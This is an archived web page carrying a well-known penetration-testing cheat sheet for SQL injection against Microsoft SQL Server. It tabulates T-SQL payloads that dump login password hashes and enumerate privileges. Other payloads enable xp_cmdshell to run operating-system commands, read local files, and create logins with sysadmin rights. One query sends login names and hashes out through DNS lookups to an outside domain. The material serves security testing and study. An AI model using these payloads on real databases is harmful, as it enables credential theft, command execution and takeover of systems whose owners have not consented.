http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
		



<div class="post-88 post type-post status-publish format-standard hentry category-sql-injection tag-cheatsheet tag-mssql tag-sqlinjection" id="post-88">
<h1>MSSQL Injection Cheat Sheet</h1>
<div class="entryContent">
<p>Some useful syntax reminders for SQL Injection into MSSQL databases…

<br>
<span id="more-88"></span>
</p>
<p>This post is part of a series of SQL Injection Cheat Sheets.&nbsp; In this series, I’ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.&nbsp; This helps to highlight any features which are lacking for each database, and enumeration techniques that don’t apply and also areas that I haven’t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I’m working is:</p>
<ul>
<li>
<a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a>
</li>
<li>
<a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a>
</li>
</ul>
<p>I’m not planning to write one for MS Access, but there’s a great

<a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.

</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with “– priv” at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 — comment

<br>
SELECT /*comment*/1

</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();

<br>
SELECT system_user;

<br>
SELECT user;

<br>
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID

</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins — priv, mssql 2000;

<br>
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000.&nbsp; Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.

<br>
SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;

<br>
SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005

</td>
</tr>
<tr>
<td>&nbsp;Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.&nbsp;

<a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.

</td>
</tr>
<tr>
<td>List Privileges</td>
<td>– current privs on a particular object in 2005, 2008

<br>
SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database

<br>
SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server

<br>
SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table

<br>
SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);

<p></p>
<p>–permissions on a user– current privs in 2005, 2008

<br>
SELECT is_srvrolemember(‘sysadmin’);

<br>
SELECT is_srvrolemember(‘dbcreator’);

<br>
SELECT is_srvrolemember(‘bulkadmin’);

<br>
SELECT is_srvrolemember(‘diskadmin’);

<br>
SELECT is_srvrolemember(‘processadmin’);

<br>
SELECT is_srvrolemember(‘serveradmin’);

<br>
SELECT is_srvrolemember(‘setupadmin’);

<br>
SELECT is_srvrolemember(‘securityadmin’);

</p>
<p>– who has a particular priv? 2005, 2008

<br>
SELECT name FROM master..syslogins WHERE denylogin = 0;

<br>
SELECT name FROM master..syslogins WHERE hasaccess = 1;

<br>
SELECT name FROM master..syslogins WHERE isntname = 0;

<br>
SELECT name FROM master..syslogins WHERE isntgroup = 0;

<br>
SELECT name FROM master..syslogins WHERE sysadmin = 1;

<br>
SELECT name FROM master..syslogins WHERE securityadmin = 1;

<br>
SELECT name FROM master..syslogins WHERE serveradmin = 1;

<br>
SELECT name FROM master..syslogins WHERE setupadmin = 1;

<br>
SELECT name FROM master..syslogins WHERE processadmin = 1;

<br>
SELECT name FROM master..syslogins WHERE diskadmin = 1;

<br>
SELECT name FROM master..syslogins WHERE dbcreator = 1;

<br>
SELECT name FROM master..syslogins WHERE bulkadmin = 1;

</p>
</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?&nbsp; returns 1 for true, 0 for false, NULL for invalid role.&nbsp; Also try ‘bulkadmin’, ‘systemadmin’ and other values from the

<a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation

<br>
</a> SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.

<br>
SELECT name FROM&nbsp;master..syslogins WHERE sysadmin = ’1′ — tested on 2005

</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;

<br>
SELECT DB_NAME(N); — for N = 0, 1, 2, …

</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only

<br>
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views

<br>
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;

<br>
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>– NB: This example works only for the current database.&nbsp; If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).

<br>
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’

</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(‘abcd’, 3, 1) — returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 — returns 2

<br>
SELECT 6 &amp; 1 — returns 0

</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0×41) — returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(‘A’) – returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(’1′ as int);

<br>
SELECT CAST(1 as char)

</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT ‘A’ + ‘B’ – returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td>
<span>IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1</span>
</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) — returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>&nbsp;WAITFOR DELAY ’0:0:5′ — pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.&nbsp; Messy but necessary.

<br>
– Also check out theDNS tunnel feature of

<a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a>
</td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:

<br>
EXEC sp_configure ‘show advanced options’, 1; — priv

<br>
RECONFIGURE; — priv

<br>
EXEC sp_configure ‘xp_cmdshell’, 1; — priv

<br>
RECONFIGURE; — priv

</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));

<br>
BULK INSERT mydata FROM ‘c:boot.ini’;

<br>
DROP TABLE mydata;

</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC

<a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> ‘user’, ‘pass’; — priv

</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC

<a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> ‘user’; — priv

</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC

<a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> ‘user’, ‘sysadmin; — priv

</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; –location of master.mdf

<br>
EXEC sp_helpdb pubs; –location of pubs.mdf

</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind

<br>
model

<br>
msdb

<br>
pubs — not on sql server 2005

<br>
tempdb

</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p>
<strong>From Dan Crowley:</strong>
<br>
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a>
</p>
<p>
<strong>From Jeremy Bae:</strong>
<br>
Tip about sp_helpdb – included in table above.

</p>
<p>
<strong>From Trip:</strong>
<br>
List DBAs (included in table above now):

</p>
<blockquote>
<p>select name from master..syslogins where sysadmin = ’1′</p>
</blockquote>
<p>
<strong>From Daniele Costa:</strong>
<br>
Tips on using fn_my_permissions in 2005, 2008 – included in table above.

<br>
Also:

<br>
To check permissions on multiple database you will have to use the following pattern.

</p>
<blockquote>
<p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, ‘DATABASE’)</p>
</blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.

<br>
In this case a simple trick is to use the following syntax:

</p>
<blockquote>
<p> select permission_name collate database_default  FROM fn_my_permissions (NULL, ‘DATABASE’)
</p>
</blockquote>
<div class="clear"></div>
<p>Tags:

<a href="http://pentestmonkey.net/tag/cheatsheet" rel="tag">cheatsheet</a>,

<a href="http://pentestmonkey.net/tag/mssql" rel="tag">mssql</a>,

<a href="http://pentestmonkey.net/tag/sqlinjection" rel="tag">sqlinjection</a>
</p>
<p>Posted in

<a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts in SQL Injection" rel="category tag">SQL Injection</a>
</p>
</div>
</div>
</div>